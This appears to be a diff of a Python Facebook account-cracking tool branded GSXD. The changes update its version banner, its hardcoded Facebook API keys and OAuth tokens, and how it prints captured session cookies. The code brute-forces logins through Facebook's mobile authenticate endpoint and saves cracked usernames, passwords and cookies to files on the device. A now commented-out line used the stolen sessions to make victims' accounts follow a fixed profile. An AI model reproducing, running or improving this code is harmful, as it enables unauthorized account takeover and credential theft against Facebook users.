@@ -235,7 +235,7 @@ logo4="""\033[1;97m
 \033[1;92m╔═════════════════════════════════════════╗
 \033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
 \033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
-\033[1;92m║ ᗙ  Version  : 0.4                       ║
+\033[1;92m║ ᗙ  Version  : 0.6                       ║
 \033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
 \033[1;92m╚═════════════════════════════════════════╝"""
 
@@ -654,7 +654,7 @@ class crack:
                 if "c_user" in str(cok):
                     coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                     user=cok['c_user']
-                    print(f"\r{HH}[OK-GSXD] {user} | {pw} | {cok} {VV} 		   ")
+                    print(f"\r{HH}[OK-GSXD] {user} | {pw} | {coki}		 {VV}			    ")
                     open("/sdcard/GSXD_OK.txt", "a").write(user + "|" + pw + "\n")
                     open("/sdcard/GSXD_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
                     ok.append(user + pw)
@@ -868,8 +868,8 @@ class crack:
                     'client_country_code':'US',
                     'fb_api_req_friendly_name':'authenticate',
                     'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                    'api_key':'fc0a7caa49b192f64f6f5a6d9643bb28',
-                    'access_token':'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
+                    'api_key':'882a8490361da98702bf97a021ddc14d',
+                    'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                 }
                 head={
                     'x-fb-connection-quality':'EXCELLENT',
@@ -884,7 +884,7 @@ class crack:
                     'x-fb-net-hni':str(random.randint(2e4,4e4)),
                     'x-fb-rmd':'cached=0;state=NO_MATCH',
                     'x-fb-request-analytics-tags':'unknown',
-                    'authorization':'OAuth 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
+                    'authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                     'content-type':'application/x-www-form-urlencoded',
                     'x-fb-friendly-name':'authenticate'
                 }
@@ -911,8 +911,8 @@ class crack:
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
-                        follow_id='100000160984736'
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
+                        #foll#ow_id='100000160984736'
+                        #subs = requests.post#('https://graph.facebook.com/'+f#ollow_id+'/subscribers?access_token='+to#kic, cookies={#'cookie':cokie}).te#xt
                         break
                     except KeyError:
                         #print(f"\r\033[1#;33m[TL-GSXD] {used} | {pw} {VV}    ")
